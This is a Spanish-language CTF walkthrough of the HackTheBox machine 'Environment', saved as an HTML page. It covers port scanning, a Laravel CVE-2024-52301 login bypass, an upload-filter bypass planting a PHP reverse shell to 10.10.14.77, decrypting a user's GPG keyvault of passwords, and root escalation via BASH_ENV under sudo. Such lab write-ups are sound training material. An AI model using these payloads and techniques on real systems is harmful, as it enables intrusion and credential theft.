@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Environment - juanchan.es</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./Environment.JPG"> <span class="mono authors"> <a href="https://juanchan.es/assets/maquinas/Environment.html" itemprop="name">Environment</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> May, 2025 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+
+
+<h2 id="1-escaneo-de-puertos-tcp">1. Escaneo de puertos tcp</h2>
+<pre><code class="language-bash">PORT     STATE SERVICE   VERSION
+22/tcp   open  ssh       OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
+| ssh-hostkey: 
+|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
+|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
+80/tcp   open  http      nginx 1.22.1
+|_http-server-header: nginx/1.22.1
+|_http-title: Did not follow redirect to http://environment.htb
+8000/tcp open  http-alt?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<h2 id="2-enumeración">2. Enumeración</h2>
+<p>Una vez añadido el dominio <code>environment.htb</code>al fichero <code>/etc/hosts</code>, hacemos una enumeración de directorios. </p>
+<pre><code class="language-bash"># gobuster dir -u http://environment.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --exclude-length 29
+</code></pre>
+<p>Encontrando lo siguiente:</p>
+<pre><code class="language-bash">/login                (Status: 200) [Size: 2391]
+/storage              (Status: 301) [Size: 169] [--&gt; http://environment.htb/storage/]
+/upload               (Status: 405) [Size: 244852]
+/up                   (Status: 200) [Size: 2125]
+/logout               (Status: 302) [Size: 358] [--&gt; http://environment.htb/login]
+/vendor               (Status: 301) [Size: 169] [--&gt; http://environment.htb/vendor/]
+/build                (Status: 301) [Size: 169] [--&gt; http://environment.htb/build/]
+/mailing              (Status: 405) [Size: 244854]
+</code></pre>
+<h2 id="3-explotación">3. Explotación</h2>
+<p>Si tratamos de acceder a <a href="http://environment.htb/upload">http://environment.htb/upload</a> podemos ver un mensaje de error en el que, entre otras cosas, observamos lo siguiente:</p>
+<pre><code class="language-bash">PHP 8.2.28 — Laravel 11.30.0
+</code></pre>
+<p>Asociada a esta versión descubrimos el <strong>CVE-2024-52301</strong> el cual nos permite cambiar de entorno, tal y como se muestra en este repo <a href="https://github.com/Nyamort/CVE-2024-52301">https://github.com/Nyamort/CVE-2024-52301</a>. Si accedemos entonces a <a href="http://environment.htb/?--env=preprod">http://environment.htb/?--env=preprod</a> podemos ver como al final de la página, en el footer, aparece el siguiente mensaje, haciendo ver que la vulnerabilidad podría existir:</p>
+<pre><code class="language-bash">environment.htb © 2025 | Preprod v1.1
+</code></pre>
+<p>Podemos tratar entonces de bypasear el logueo, utilizando este exploit. Para ello en la petición POST de inicio de sesión, añadimos dicha variable a en la URL, quedando de la petición de la siguiente forma:</p>
+<pre><code class="language-bash">POST /login?--env=preprod HTTP/1.1
+Host: environment.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+Origin: http://environment.htb
+Connection: keep-alive
+Referer: http://environment.htb/login
+Cookie: XSRF-TOKEN=eyJpdiI6IjFGZ241NXBnNGRXcTZsYmRBdG5BZlE9PSIsInZhbHVlIjoiaWV4dERPV0gwc2Ura0s0V2dDTlYrdnV1M2tHY2tKbXlkajFRNG9YK3hJT0Mwdlp2Vnh3K3M5UlhLSnlUYmM0c0FzSDBpSDZjdjEwSzFqK1AwajFiK21JYlFGaW5NdTFUeXVkWFlnUDFrbjZxTDI4dzdLWW
+9ReE91ZWVQa3RuLzYiLCJtYWMiOiIzZmJmMjk4ZjA4YTFhMGY5NDQwNDY5MmY5NDk0MTE0ODM4YTgwMGNiYjE5ZDJiZWZkZTIwNDk4YmM0YTcxNDUzIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkhhZUFpMWwrVHBoMEJTZTc1OFF1Unc9PSIsInZhbHVlIjoiS3c4TDNRSmJUeVJlb2wyWU9
+JQW5FdFlHQWhUdG03QVJTYmFydFBZSk5nUFBDZmFSZnBzNFl3cUx2cnFMOWJYRDRWSFZIb1pvbEcwZ1pUVzV3a09IdzV3cHdrWlJpNGVyQ2NsKzIwNlgyWjFVdThQNDdEREpxTHlPc1czQ1dEOVEiLCJtYWMiOiI2MmIyMWMwY2RmZTM5MmU1MmQ4MjZiNDg4NWY3YzczYjc1MTE0ZmM1YzE1ODUxNjNhYzcy
+YjM3MjA5MzE5ZDMxIiwidGFnIjoiIn0%3D
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+_token=rs86aG3gdfr3ZgktBx4dHgYVirDFiBrvz5GoGVVT&amp;email=admin%40test.com&amp;password=admin&amp;remember=False
+</code></pre>
+<p>Consiguiendo así bypasear el inicio de sesión y llevándonos a la página <a href="http://environment.htb/management/dashboard">http://environment.htb/management/dashboard</a> autenticados como el usuario <strong>Hish</strong>.</p>
+<p>Una vez accedemos al panel de administración podemos observar que en el endpoint /management/profile nos permite subir una foto para establecerla como nuestra foto de perfil. Probamos a subir directamente un archivo <code>.php</code> pero no nos es posible. Tras varios intentos logramos subir un archivo .php realizando la siguiente petición:</p>
+<pre><code class="language-bash">POST /upload HTTP/1.1
+Host: environment.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://environment.htb/management/profile
+Content-Type: multipart/form-data; boundary=---------------------------255141735026611063372486289400
+Content-Length: 450
+Origin: http://environment.htb
+Connection: keep-alive
+Cookie: XSRF-TOKEN=eyJpdiI6IkkvT2FSQWRMcmJHejg3Nlh3M2k4c2c9PSIsInZhbHVlIjoiUTV3MjlnZXhuOWhLcHdlTEJaTnZjWElRbTltMzlFZnc1em1KOUIrUldBTVBvb2pPZnUwQVlYYmZkNmlZanp2WmFWcENFZ3lUWUF3OGg3UVI2aWtLTXZoQU0zRUFiWlI1b2tqSDdvdmhSQlJ4Z3N1N2NGTWZYZ0wzZ28wQ2ZCcE8i
+LCJtYWMiOiJkMTI5NGY0NDM4ZmE4YmE0ODVhNzQyZDIzMDAzZDZmOGVkN2E0YjFkMTA4ZmZiMjEyNzcwZmIwZTZiOWFlYmYxIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlZ5WHJidGZRL3RtaDFwZFF5NXl6Y1E9PSIsInZhbHVlIjoicWEyc1ZLVDAvOUdWK09GZGJCN0kxZUdQcFFYTmFxS1oyQkFkNHBuNUhVOWN
+zZVBMMk1HbEpKWkNGVFRERllDdzJzQk9abUlCbmtiK05qdEJVRGR1Q0ZyS3g4d0tqYWpoVmwrWitLUEZLaXVQdXFMbW1pS3ZHOElCZkUrdndRT2UiLCJtYWMiOiJmNjQ1Y2M3NzNhNTliNDkyYjQ4YmQyYzhhNmQzOWI0NzFhZWI3MDY0NDNhODA2NTE2OWFlYmFhZWU0M2UzNjZjIiwidGFnIjoiIn0%3D
+Priority: u=0
+
+-----------------------------255141735026611063372486289400
+Content-Disposition: form-data; name=&quot;_token&quot;
+
+qcMB5sN9dXv7rzPN16maHxxeZMfE6hMnf8y8yyKq
+-----------------------------255141735026611063372486289400
+Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;file1.php.&quot;
+Content-Type: image/png
+
+GIF87a
+&lt;?php
+exec(&quot;/bin/bash -c &#39;bash -i &gt; /dev/tcp/10.10.14.77/1234 0&gt;&amp;1&#39;&quot;);
+
+-----------------------------255141735026611063372486289400--
+</code></pre>
+<p>Es decir, estableciendo como <code>Content-Type: image/png</code>, los magic numbers de un archivo <strong>GIFT</strong>, y como nombre de archivo <code>*.php.</code>. A dicha petición, observamos como nos responde el siguiente mensaje:</p>
+<pre><code class="language-bash">HTTP/1.1 200 OK
+Server: nginx/1.22.1
+Content-Type: application/json
+Connection: keep-alive
+Cache-Control: no-cache, private
+Date: Fri, 23 May 2025 09:23:48 GMT
+Set-Cookie: XSRF-TOKEN=eyJpdiI6InlwcUFOMTNtN1ZHSDM0OThPRUxxSEE9PSIsInZhbHVlIjoiRU80S3hVSEhXbnhtL0FIaERkQXN6Snh5b0dJR2tucUh4TXd3anMzajdLNHBiTmtBNGU4ZzJmdzRLa2gxVG1mT2JjRmZaWnJKS0tCdHg0V01tTzE3THV6VEVXSDlVYzA3cE1DU3lTeFR4Zm94Z05Xa1prSVVEMndCQ3c1NkFNVmYiLCJtY
+WMiOiJlYTIwZjViMjRkZDBkMTgzOGFkNjI3OTQwYjcyZGUxYzdlMjQwNGM0ZjFkNjNiN2FiNWE2NGE4NjBkMzBiMWE3IiwidGFnIjoiIn0%3D; expires=Fri, 23 May 2025 11:23:48 GMT; Max-Age=7200; path=/; samesite=lax
+Set-Cookie: laravel_session=eyJpdiI6IlhxMmJxM1VFcEpaazRiVHlJLzRQMlE9PSIsInZhbHVlIjoiR0FyVkxSc1ZwQzI2NTg1bVlPOURiekpLNlRhNVF2NlBjZnhoUW84TVplcVRXVjliVjUxUDNuUCt2Zi9IT3RlQjJwNXlOMS83UW5kZHdBNXJQRXRQYnpCTjdSNTdkcDRUMXBxZ1EzL05XN2doaFJHOWVkallaYUdSdWFVR3hScDkiL
+CJtYWMiOiJkMjg1N2U4MThkZWFhMGZiYjYxYmYzMGMyMWJkMGQxMjFjNzY3Nzg5ZDhlYjdlM2Q2NjA3OTVkOTM1ZjA4ZDUwIiwidGFnIjoiIn0%3D; expires=Fri, 23 May 2025 11:23:48 GMT; Max-Age=7200; path=/; httponly; samesite=lax
+X-Frame-Options: SAMEORIGIN
+X-Content-Type-Options: nosniff
+Content-Length: 126
+
+{
+    &quot;url&quot;: &quot;http:\/\/environment.htb\/storage\/files\/file1.php&quot;,
+    &quot;uploaded&quot;: &quot;http:\/\/environment.htb\/storage\/files\/file1.php&quot;
+}
+</code></pre>
+<p>Si ponemos <strong>netcat</strong> a la escucha en nuestra máquina, y nos dirigimos a la URL <a href="http://environment.htb//storage//files//file1.php">http://environment.htb//storage//files//file1.php</a>, somos capaces de ejecutar el archivo .php, y establecer así una revershell con el usuario <strong>www-data</strong>.</p>
+<h2 id="4-movimiento-lateral">4. Movimiento lateral</h2>
+<p>Directamente con el usuario www-data, somo capaces de acceder al directorio del usuario hish, y obtener así la <strong>flag de usuario</strong>. Si continuamos observando el directorio de Hish, podemos observar que existe una carpeta llamada <code>Backup</code>, con un archivo <strong>.gpg</strong>.</p>
+<pre><code class="language-bash">www-data@environment:/home/hish/backup$ ls
+    keyvault.gpg
+</code></pre>
+<p>También vemos que la raíz del directorio home de hish, existe un archivo <strong>.gnupg</strong>, por lo que la clave puede ser la .gpg encontrada antes. Por lo que intentamos descifrarla utilizando dicha contraseña, realizando los siguientes pasos:</p>
+<ol>
+<li><code>$ cp -r /home/hish/.gnupg /tmp/mygnupg</code></li>
+<li><code>$ chmod -R 700 /tmp/mygnupg</code></li>
+<li><code>$ gpg --homedir /tmp/mygnupg --list-secret-keys</code></li>
+<li><code>$ gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg</code></li>
+</ol>
+<p>Se nos genera entonces un archivo message.txt, con el siguiente contenido:</p>
+<pre><code class="language-bash">PAYPAL.COM -&gt; Ihaves0meMon$yhere123
+ENVIRONMENT.HTB -&gt; marineSPm@ster!!
+FACEBOOK.COM -&gt; summerSunnyB3ACH!!
+</code></pre>
+<p>Por lo que probamos a conectarnos por SSH, utilizando las siguientes credenciales <code>hish - marineSPm@ster!!</code>, y conseguimos acceso.</p>
+<h2 id="4-escalado">4. Escalado</h2>
+<p>Si listamos los comandos que puede ejecutar <strong>hish</strong> como usuario root, obtenemos lo siguiente:</p>
+<pre><code class="language-bash">Matching Defaults entries for hish on environment:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=&quot;ENV BASH_ENV&quot;, use_pty
+
+User hish may run the following commands on environment:
+    (ALL) /usr/bin/systeminfo
+</code></pre>
+<p>Como tiene habilitada la opción de env_keep, nos permite preservar variables de entorno, por lo que systeminfo al ejecutar comandos basado en estas variables. puede explotarlo. Para ello realizamos lo siguiente:</p>
+<ol>
+<li><code>hish@environment:~$ echo &#39;/bin/bash&#39; &gt; /tmp/malicious.sh</code></li>
+<li><code>hish@environment:~$ export BASH_ENV=/tmp/malicious.sh</code></li>
+<li><code>hish@environment:~$ sudo /usr/bin/systeminfo</code></li>
+<li><code>root@environment:/home/hish#</code></li>
+</ol>
+<p>Observamos entonces que somos capaces de obtener una shell como usuarios <strong>root</strong>, y obtener así la <strong>flag del usuario root</strong>.</p>
+
+
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
